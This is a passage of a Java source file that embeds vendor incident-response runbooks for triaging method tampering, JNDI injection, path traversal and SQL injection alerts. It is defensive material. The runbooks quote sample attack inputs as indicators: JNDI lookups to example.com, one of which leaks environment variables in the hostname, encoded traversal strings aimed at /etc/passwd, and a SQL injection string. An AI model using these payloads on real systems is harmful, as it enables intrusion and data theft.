      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),
  METHOD_TAMPERING(
      List.of("method-tampering"),
      """
      ---
      layout: runbook
      title: "HTTP Method Tampering"
      description: "Guide for handling attacks where malicious actors manipulate HTTP methods to bypass authentication, authorization, or other security mechanisms"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # HTTP Method Tampering Runbook

      Method Tampering (aka verb tampering or HTTP method tampering) is an attack where an attacker manipulates the HTTP method used in a request to a web application. Providing unexpected HTTP methods can sometimes bypass authentication, authorization or other security mechanisms.


      Example Event - Exploited outcome HTTP Method Tampering \s
      `Oct 21 08:58:55 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input METHOD had a value that successfully exploited method-tampering - SOMEMETHOD|WARN|pri=method-tampering src=0:0:0:0:0:0:0:1 spt=8080 request=/error requestMethod=com.contrastsecurity.agent.contrastapi_v1_0.RequestMethod$1@1cf573b7 app=webapplication outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome HTTP Method Tampering \s
      `Oct 21 09:00:03 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input METHOD had a value that successfully exploited method-tampering - SOMEMETHOD|WARN|pri=method-tampering src=0:0:0:0:0:0:0:1 spt=8080 request=/ requestMethod=com.contrastsecurity.agent.contrastapi_v1_0.RequestMethod$1@12076e97 app=webapplication outcome=BLOCKED`
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)


      - [Success](#success)


      ## Exploited

      "Exploited" means Contrast detected an abnormal HTTP method used in an incoming request, and the response code was not a 501 or 405 indicating the request was processed. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Does the request contain an abnormal HTTP method? (e.g one that is not defined in the HTTP RFC)
      - Is the HTTP response code not a 501 or 405?
      - Does the HTTP method make sense in the context of the application? (e.g a DELETE request to a static resource)



      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" means Contrast detected an abnormal HTTP method used in an incoming request, therefore blocked execution of the request. \s

      To verify this is a true positive, review the following attributes of the event:

      - Does the request contain an abnormal HTTP method? (e.g one that is not defined in the HTTP RFC)
      - Is the HTTP response code not a 501 or 405?
      - Does the HTTP method make sense in the context of the application? (e.g a DELETE request to a static resource)



      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),

  JNDI_INJECTION(
      List.of("jndi-injection"),
      """
      ---
      layout: runbook
      title: "JNDI Injection"
      description: "Guide for addressing attacks where malicious actors exploit JNDI lookups to achieve remote code execution or data exfiltration through malicious JNDI servers"
      ---1

      <!-- \\ or two whitespaces used for line breaks -->
      # JNDI Injection Runbook

      JNDI injection is a malicious technique where attackers exploit vulnerabilities in web applications to influence the server used in a JNDI lookup. Where an attacker can influence the server the JNDI Lookup is sent to, it is possible to get the server to connect to a malicious JNDI Server which returns a malicious class which when loaded will give the attacker Remote Code Execution on the impacted server. Also in the case of infamous log4shell vulnerability, as well as RCE, it is possible to exfiltrate data fro the impacted server.

      Example Event - Exploited outcome JNDI Injection \s
      `Oct 17 10:53:34 172.19.0.2 CEF:0|Contrast Security|Contrast Agent Java|6.7.0|SECURITY|The input UNKNOWN had a value that successfully exploited jndi-injection - null|WARN|pri=jndi-injection src=172.19.0.5 spt=8081 request=/registerEmail requestMethod=POST app=Petclinic-burp-demo-jb-2-Email-Service outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome JNDI Injection \s
      `Oct 17 12:04:07 172.19.0.2 CEF:0|Contrast Security|Contrast Agent Java|6.7.0|SECURITY|The input UNKNOWN had a value that successfully exploited jndi-injection - null|WARN|pri=jndi-injection src=172.19.0.5 spt=8081 request=/registerEmail requestMethod=POST app=Petclinic-burp-demo-jb-2-Email-Service outcome=BLOCKED`
       \s
       \s

      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Success](#success)

      ## Exploited

      An "Exploited" outcome means Contrast detected an input coming into an application that is then used to create a JNDI Query with the protocol RMI or LDAP. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - An unknown LDAP or RMI Server.

      \\
      Examples:

      - `jndi:ldap://example.com:1389/jdk8`
      - `jndi:rmi://example.com:1389/jdk8`
      - `jndi:ldap://${env:USER}.${env:USERNAME}.example.com:1389/` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" outcome means Contrast detected an input coming into an application that is then used to create a JNDI Query with the protocol RMI or LDAP and Contrast stopped the Query from executing. \s

      To verify this is a true positive, review the following attributes of the event:

      - An unknown LDAP or RMI Server.

      \\
      Examples:

      - `jndi:ldap://example.com:1389/jdk8`
      - `jndi:rmi://example.com:1389/jdk8`
      - `jndi:ldap://${env:USER}.${env:USERNAME}.example.com:1389/` \s

      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s

      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s

      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),
  PATH_TRAVERSAL(
      List.of(
          "path-traversal",
          "path-traversal-semantic-file-security-bypass",
          "jmx-console-path-traversal"),
      """
      ---
      layout: runbook
      title: "Path Traversal"
      description: "Guide for handling attacks where unauthorized access is gained to server file system folders outside the web root through path manipulation"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # Path Traversal Runbook

      Path traversal attacks use an affected application to gain unauthorized access to server file system folders that are higher in the directory hierarchy than the web root folder. A successful path traversal attack can fool a web application into reading and consequently exposing the contents of files outside of the document root directory of the application or the web server, including credentials for back-end systems, application code and data, and sensitive operating system files. If successful this can lead to unauthorized data access, data exfiltration, and remote code execution.


      Example Event - Exploited outcome Path Traversal \s
      `Oct 04 12:33:38 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The parameter file had a value that successfully exploited path-traversal - ../../../etc/passwd|WARN|pri=path-traversal src=1.1.1.1 spt=8080 request=/file requestMethod=GET app=Web Application outcome=EXPLOITED` \s
       \s

      Example Event - Probed (or Ineffective) outcome Path Traversal \s
      `Oct 04 12:29:32 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The URI URI had a value that matched a signature for, but did not successfully exploit, path-traversal - /file=/etc/passwd|WARN|pri=path-traversal src=1.1.1.1 spt=8080 request=/file=/etc/passwd requestMethod=GET app=Web Application outcome=INEFFECTIVE`\s
       \s
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      An "Exploited" outcome means Contrast detected an input resembling a Path Traversal attack that reached a vulnerable file operation, and then successfully manipulated that operation to access a file outside the intended directory. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Are there plain or encoded path traversal sequences present? (../, %2e%2e%2f)
      - Are suspicious files or paths being requested? (/etc/shadow, /etc/passwd, c:\\windows\\system32\\, etc)
      - Are any known file security bypasses present in the file path? (::$DATA, ::$Index, (null byte))
      - Are unexpected files present in the filesystem?
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there application logs with file operation related error messages around the same timestamp as the event?



      \\
      Examples:

      - `../../../etc/passwd`
      - `%2e%2e%2fetc%2fpasswd`
      - `\\../\\../\\etc/\\password`
      - `..0x2f..0x2fetc0x2fpasswd` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" means Contrast detected an input resembling a Path Traversal attack that reached a vulnerable file operation, and therefore blocked the application from performing the operation \s

      To verify this is a true positive, review the following attributes of the event:

      - Are there plain or encoded path traversal sequences present? (../, %2e%2e%2f)
      - Are suspicious files or paths being requested? (/etc/shadow, /etc/passwd, c:\\windows\\system32\\, etc)
      - Are any known file security bypasses present in the file path? (::$DATA, ::$Index, (null byte))
      - Are unexpected files present in the filesystem?
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there application logs with file operation related error messages around the same timestamp as the event?


      \\
      Examples:

      - `../../../etc/passwd`
      - `%2e%2e%2fetc%2fpasswd`
      - `\\../\\../\\etc/\\password`
      - `..0x2f..0x2fetc0x2fpasswd` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means Contrast detected an input coming into an application that looked like Path Traversal, but did not confirm that the input was used in a file operation. This is called a “Probe” within the Contrast UI. This event is a real attack attempt to exploit your application, but it was ineffective. Probes can indicate an attacker scanning or exploring for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),
  SQL_INJECTION(
      List.of("sql-injection", "nosql-injection"),
      """
      ---
      layout: runbook
      title: "SQL Injection"
      description: "Guide for addressing SQL injection attacks where malicious actors exploit vulnerabilities to inject unauthorized SQL commands into the database"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # SQL Injection Runbook

      SQL injection is a malicious technique where attackers exploit vulnerabilities in web applications to inject unauthorized SQL commands into the database. By carefully crafting input data, attackers can manipulate the SQL queries executed by the application, potentially leading to unauthorized data access, data modification, or even complete database compromise.


      Example Event - Exploited outcome SQL Injection \s
      `Jul 18 2024 13:14:35.717-0400 192.168.0.158 CEF:0|Contrast Security|Contrast Agent Java|6.5.4|SECURITY|The parameter lastName had a value that successfully exploited sql-injection - doe' or 1=1 AND|WARN|pri=sql-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/customers requestMethod=GET app=Web Application outcome=EXPLOITED` \s
       \s

      Example Event - Probed (or Ineffective) outcome SQL Injection \s
